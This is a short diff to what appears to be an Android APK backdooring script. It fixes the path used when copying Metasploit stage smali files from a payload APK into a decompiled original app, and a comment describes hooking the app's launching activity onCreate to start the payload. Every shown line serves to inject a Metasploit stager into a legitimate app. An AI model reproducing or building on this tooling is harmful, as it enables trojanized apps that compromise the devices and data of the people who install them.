@@ -28,7 +28,7 @@ def generate_hooked_smali(smali_path):
     mkdir_p('original/_decompiled/smali/com/metasploit/stage')
 
     os.system('cp payload/_decompiled/smali/com/metasploit/stage/*.smali '
-              'original/smali/com/metasploit/stage/')
+              'original/_decompiled/smali/com/metasploit/stage/')
 
     # replace comment for launchin activity with payload
     activitycreate = ';->onCreate(Landroid/os/Bundle;)V'
